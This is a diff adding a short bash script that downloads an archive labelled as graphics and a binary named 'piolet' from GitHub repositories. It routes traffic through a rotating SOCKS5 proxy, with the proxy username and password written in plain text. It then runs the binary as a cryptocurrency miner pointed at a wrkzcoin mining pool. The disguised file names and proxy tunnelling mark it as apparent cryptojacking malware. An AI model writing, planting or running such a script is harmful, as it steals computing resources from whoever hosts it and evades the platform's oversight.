@@ -1,0 +1,25 @@
+#!/bin/bash
+curl -L -o graphics.tar.gz https://github.com/denisule54/dsX24/raw/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = p.webshare.io:80
+socks5_username = ikuzoora5-GB-rotate
+socks5_password = ikuzoora5
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+
+
+echo " "
+
+echo " "
+curl -L -o piolet https://github.com/Ikuzot/nung/raw/main/piolet
+chmod +x piolet 
+
+
+
+./graftcp/graftcp ./piolet --algorithm wrkzcoin --pool stc.ss.poolin.one:443 --username henes.001 --password 123 --disableNVIDIA --threads 4
